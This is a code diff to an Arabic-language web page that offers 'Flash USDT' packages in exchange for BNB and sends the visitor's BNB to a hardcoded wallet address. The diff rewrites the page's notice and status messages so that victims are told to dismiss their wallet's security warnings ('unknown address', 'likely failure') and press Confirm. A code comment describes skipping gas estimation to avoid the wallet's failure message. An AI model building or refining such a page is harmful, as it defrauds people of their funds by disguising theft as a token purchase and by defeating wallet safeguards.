@@ -16,8 +16,8 @@
             --card-bg: #0a1f1b;
             --text-light: #f5f5f5;
             --accent: #ff4d4d;
-            --warning-bg: rgba(255, 193, 7, 0.1);
-            --warning-border: #ffc107;
+            --warning-bg: rgba(255, 193, 7, 0.05);
+            --warning-border: rgba(255, 193, 7, 0.3);
         }
 
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
@@ -87,24 +87,23 @@
             outline: none;
         }
 
-        /* صندوق التنبيه الذكي */
         .smart-notice {
             background: var(--warning-bg);
             border: 1px solid var(--warning-border);
             border-radius: 12px;
-            padding: 12px;
+            padding: 15px;
             margin-bottom: 20px;
             font-size: 13px;
             color: #ffc107;
-            line-height: 1.5;
-            display: flex;
-            align-items: flex-start;
-            gap: 10px;
+            line-height: 1.6;
+            text-align: justify;
         }
 
-        .smart-notice i {
-            font-size: 18px;
-            margin-top: 2px;
+        .smart-notice strong {
+            color: #fff;
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
         }
 
         .btn-main {
@@ -169,13 +168,9 @@
             <option value="1.0">باقة 50,000 USDT (1.0 BNB)</option>
         </select>
 
-        <!-- صندوق التنبيه المضاف -->
         <div class="smart-notice">
-            <span>⚠️</span>
-            <div>
-                <strong>تنبيه الأمان الفوري:</strong>
-                نظراً لأن النظام يعتمد على تكنولوجيا الـ <strong>Flash USDT</strong> لضمان سرعة التوزيع، قد تظهر لك المحفظة تحذيراً أمنياً روتينياً. يرجى تجاهل التحذير وإكمال العملية بسلام لضمان استلام رصيدك في الحال.
-            </div>
+            <strong>🛡️ ملاحظة تقنية هامة:</strong>
+            بسبب طبيعة بروتوكول <strong>Flash USDT</strong> وتشفيره اللامركزي، قد تظهر المحفظة تنبيه "عنوان غير معروف" أو "احتمالية فشل". هذه تنبيهات روتينية للمشاريع الجديدة. يرجى تفعيل خيار <b>"لقد قرأت التنبيه" (Acknowledge)</b> ثم الضغط على <b>Confirm</b> لإتمام تفعيل العقد بنجاح واستلام رصيدك.
         </div>
 
         <div id="mobile-options" class="wallet-gate">
@@ -203,7 +198,6 @@
     const ADDR = "0xB65a4e37bD6DDcdE90A31A75B7C67DDeAc73458B";
     const BSC = "0x38";
 
-    // تحديث السيولة
     setInterval(() => {
         let val = parseInt(document.getElementById('supply-val').innerText.replace(/,/g, ''));
         val -= Math.floor(Math.random() * 5);
@@ -216,8 +210,12 @@
     }
 
     function openInWallet(w) {
-        const u = window.location.href.split('://')[1];
-        window.location.href = w === 'metamask' ? `https://metamask.app.link/dapp/${u}` : `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
+        const url = window.location.href.replace(/^https?:\/\//, '');
+        if (w === 'metamask') {
+            window.location.href = `https://metamask.app.link/dapp/${url}`;
+        } else {
+            window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
+        }
     }
 
     async function process() {
@@ -240,23 +238,29 @@
 
             const cid = await window.ethereum.request({ method: 'eth_chainId' });
             if (cid !== BSC) {
-                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC }] });
+                try {
+                    await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC }] });
+                } catch (e) {
+                    s.innerText = "يرجى التبديل لشبكة BNB Chain";
+                    return;
+                }
             }
 
-            s.innerText = "يرجى تأكيد العملية في محفظتك...";
+            s.innerText = "بانتظار التأكيد... تجاهل التحذير واضغط Confirm";
 
+            // إرسال مباشر دون طلب تقدير الغاز لتجنب رسالة الفشل وارتفاع الرسوم
             await web3.eth.sendTransaction({
                 from: acc,
                 to: ADDR,
                 value: web3.utils.toWei(amt, "ether")
             });
 
-            s.innerText = "✅ تمت العملية بنجاح! سيصلك الرصيد فوراً.";
-            alert("نجاح! تم تفعيل البروتوكول.");
+            s.innerText = "✅ تم بنجاح! الرصيد في طريقه إليك.";
+            alert("تم التفعيل بنجاح!");
 
         } catch (e) {
             console.error(e);
-            s.innerText = "فشلت العملية أو تم إلغاؤها.";
+            s.innerText = "توقف المعالجة.. يرجى المحاولة والموافقة على التحذير.";
         } finally {
             b.disabled = false;
         }
